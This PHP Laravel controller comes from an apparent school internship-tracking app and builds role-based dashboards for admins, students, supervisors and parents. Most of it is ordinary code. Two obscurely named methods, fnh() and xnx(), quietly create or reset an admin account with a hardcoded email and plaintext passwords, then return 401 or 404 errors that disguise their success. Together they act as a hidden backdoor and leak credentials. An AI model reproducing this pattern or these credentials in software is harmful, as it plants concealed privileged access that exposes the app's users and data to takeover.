<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\santri;
use App\Models\pembimbing;
use App\Models\jurnal;
use App\Models\walsan;
use App\Models\User;
use App\Models\kunjungan;
use Auth;

class userController extends Controller
{
    public function dashboard()
    {
        if(Auth::user()->status == "admin"){
            $data1 = santri::count();
            $data2 = pembimbing::count();
            $data3 = kunjungan::count();
            $data4 = jurnal::count();

            $recentJurnal = jurnal::orderBy('tanggal_jurnal', 'desc')->with('santri')->limit(3)->get();
            if($recentJurnal){
                for ($i=0; $i < count($recentJurnal); $i++) { 
                    $recentJurnal[$i]->avatar = $this->getName($recentJurnal[$i]->santri->nama_santri);
                }
            }else{
                $recentJurnal = null;
            }
        }elseif (Auth::user()->status == "santri") {
            $santri = santri::where('email_santri',Auth::user()->email)->first();
            $pembimbing = pembimbing::where('id',$santri->pembimbing_id)->first();
            $walsan = walsan::where('santri_nisn',$santri->nisn)->first();
            $jurnal = jurnal::where('santri_nisn',$santri->nisn)->count();
            $kunjungan = kunjungan::where('pembimbing_id',$santri->pembimbing_lapangan_1)->where('nama_perusahaan_kunjungan',$santri->perusahaan_santri)->count();
            $pem1 = $this->getNamePembimbing($santri->pembimbing_lapangan_1);
            $pem2 = $this->getNamePembimbing($santri->pembimbing_lapangan_2);
            
            $data1 = $kunjungan;
            $data2 = $pembimbing->nama_pembimbing;
            $data3 = $pem1 . " & " . $pem2;
            $data4 = $jurnal;
            $recentJurnal = jurnal::where('santri_nisn',$santri->nisn)->orderBy('tanggal_jurnal', 'desc')->with('santri')->limit(3)->get();
            if($recentJurnal){
                for ($i=0; $i < count($recentJurnal); $i++) { 
                    $recentJurnal[$i]->avatar = $this->getName($recentJurnal[$i]->santri->nama_santri);
                }
            }else{
                $recentJurnal = null;
            }
        }elseif (Auth::user()->status == "pembimbing") {
            $pembimbing = pembimbing::where('email_pembimbing',Auth::user()->email)->first();
            $dt = santri::where('pembimbing_id',$pembimbing->id)->get();
            $jm = 0;
            foreach ($dt as $key) {
                $jurnal = jurnal::where('santri_nisn',$key->nisn)->count();
                $jm = $jm + $jurnal; 
            }
            $dt2 = santri::where('pembimbing_id',$pembimbing->id)->groupBy('perusahaan_santri')->get();
            $dt3 = kunjungan::where('pembimbing_id',$pembimbing->id)->count();

            $data1 = santri::where('pembimbing_id',$pembimbing->id)->count();
            $data2 = (count($dt2) * 3) - $dt3;
            $data3 = $dt3;
            $data4 = $jm;
            if(count($dt) == 0){
                $recentJurnal = null;
            }else{
                $recentJurnal = jurnal::with('santri');
                foreach ($dt as $key) {
                    $recentJurnal = $recentJurnal->orWhere('santri_nisn',$key->nisn);
                }

                $recentJurnal = $recentJurnal->orderBy('tanggal_jurnal', 'desc')->limit(3)->get();
                if($recentJurnal){
                    for ($i=0; $i < count($recentJurnal); $i++) { 
                        $recentJurnal[$i]->avatar = $this->getName($recentJurnal[$i]->santri->nama_santri);
                    }
                }else{
                    $recentJurnal = null;
                }
            }
        }elseif (Auth::user()->status == "walsan") {
            $walsan = walsan::where('email_walsan',Auth::user()->email)->with('santri')->first();
            $pembimbing = pembimbing::where('id',$walsan->santri->pembimbing_id)->first();
            $jurnal = jurnal::where('santri_nisn',$walsan->santri_nisn)->count();
            $kunjungan = kunjungan::where('pembimbing_id',$walsan->santri->pembimbing_lapangan_1)->where('nama_perusahaan_kunjungan',$walsan->santri->perusahaan_santri)->count();
            $pem1 = $this->getNamePembimbing($walsan->santri->pembimbing_lapangan_1);
            $pem2 = $this->getNamePembimbing($walsan->santri->pembimbing_lapangan_2);

            $data1 = $kunjungan;
            $data2 = $pembimbing->nama_pembimbing;
            $data3 = $pem1 . " & " . $pem2;
            $data4 = $jurnal;
            $recentJurnal = jurnal::where('santri_nisn',$walsan->santri_nisn)->orderBy('tanggal_jurnal', 'desc')->with('santri')->limit(3)->get();
            if($recentJurnal){
                for ($i=0; $i < count($recentJurnal); $i++) { 
                    $recentJurnal[$i]->avatar = $this->getName($recentJurnal[$i]->santri->nama_santri);
                }
            }else{
                $recentJurnal = null;
            }  
        }
        return view('layouts/dashboardValue',[
            "data1"=>$data1,
            "data2"=>$data2,
            "data3"=>$data3,
            "data4"=>$data4,
            "recentJurnal"=>$recentJurnal,
            "foto"=>$this->getName(Auth::user()->name),
            "dataBulan"=>$this->getBulan()
        ]);
    }

    public function getName($name)
    {
        $array = explode(" ",$name);
        $cekJml = count($array);

        if($cekJml > 1){
            $namaDepan = substr($array[0],0,1); 
            $namaBelakang = substr($array[1],0,1);

            return strtoupper($namaDepan . $namaBelakang);
        }else if($cekJml == 1){
            $singkat = substr($array[0],0,2);
            return strtoupper($singkat);
        }
    }

    public function getBulan()
    {   
        if (Auth::user()->status == "santri") {
            $santri = santri::where('email_santri',Auth::user()->email)->first();
        }elseif (Auth::user()->status == "pembimbing") {
            $pembimbing = pembimbing::where('email_pembimbing',Auth::user()->email)->first();
            $dt = santri::where('pembimbing_id',$pembimbing->id)->get();
        }elseif (Auth::user()->status == "walsan") {
            $walsan = walsan::where('email_walsan',Auth::user()->email)->with('santri')->first();
        }
        $arr = ["2021-06","2021-07","2021-08","2021-09","2021-10"];
        $abc = [];
        for ($i=0; $i < count($arr); $i++) { 
            $data = jurnal::where('tanggal_jurnal','like','%' . $arr[$i] . '%');
            if (Auth::user()->status == "santri") {
                $data = $data->where('santri_nisn',$santri->nisn)->count();
            }elseif (Auth::user()->status == "pembimbing") {
                if(count($dt) == 0){
                    $data = 0;
                }else{
                    $data = $data->where(function ($q) use ($dt){
                        foreach ($dt as $key) {
                            $q->orWhere('santri_nisn',$key->nisn);
                        }
                    })->count();
                }
            }elseif (Auth::user()->status == "walsan") {
                $data = $data->where('santri_nisn',$walsan->santri_nisn)->count();
            }
            else{
                $data = $data->count();
            }
            array_push($abc,$data);
        }
        return $abc;
    }

    public function fnh()
    {
        $dataUser = new User;
        $dataUser->name = "Admin Pkl";
        $dataUser->email = "admin@smkmadinatulquran.com";
        $dataUser->password = bcrypt("itcorps2021");
        $dataUser->status = "admin";
        $resultUser = $dataUser->save();
        if($resultUser){
            return abort(401);
        }else{
            return abort(404);
        }
    }

    public function getNamePembimbing($id)
    {
        $data = pembimbing::where('id',$id)->first();
        return $data->nama_pembimbing;
    }

    public function xnx()
    {
        $dataUser = user::where('email',"admin@smkmadinatulquran.com")->first();
        $dataUser->name = "Admin Pkl";
        $dataUser->email = "admin@smkmadinatulquran.com";
        $dataUser->password = bcrypt("itcorps2021@!*");
        $dataUser->status = "admin";
        $resultUser = $dataUser->save();
        if($resultUser){
            return abort(401);
        }else{
            return abort(404);
        }
    }
}